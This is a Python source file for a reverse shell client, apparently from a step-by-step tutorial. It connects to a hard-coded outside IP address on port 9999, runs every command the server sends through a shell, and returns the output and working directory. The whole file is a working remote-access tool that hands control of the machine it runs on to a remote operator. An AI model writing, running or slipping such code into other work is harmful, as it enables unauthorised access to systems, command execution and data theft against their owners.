#!/usr/bin/env python3
"""
Reverse Shell Client
--------------------
This client connects back to the server and waits for commands.
It handles directory change requests specially and executes all other commands.
"""
import socket
import os
import subprocess
import sys

# Configuration
SERVER_IP = '178.62.237.181'  # Replace with your server's IP address
SERVER_PORT = 9999

def main():
    # Step 5: Client to Server Connection
    # Explanation: The client creates a socket and connects back to the server at (SERVER_IP, SERVER_PORT).
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((SERVER_IP, SERVER_PORT))
    except Exception as e:
        sys.exit(f"Connection failed: {e}")

    # Step 6: Completing the Client File
    # Explanation: The client now enters a loop to receive commands, execute them, and send results back.
    while True:
        try:
            data = s.recv(1024)
            if not data:
                break

            command = data.decode("utf-8", errors="ignore")
            # Handle 'cd ' (change directory) commands separately
            if command.startswith('cd '):
                try:
                    os.chdir(command[3:].strip())
                    output = ""
                except Exception as e:
                    output = f"Error changing directory: {e}\n"
            else:
                # Execute the received command using subprocess
                proc = subprocess.Popen(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE
                )
                stdout, stderr = proc.communicate()
                output = stdout.decode() + stderr.decode()

            # Append current working directory as a prompt
            cwd = os.getcwd() + "> "
            final_output = output + cwd

            s.send(final_output.encode("utf-8"))
        except Exception as e:
            s.send(f"Error: {e}\n".encode("utf-8"))
            break

    s.close()

if __name__ == '__main__':
    main()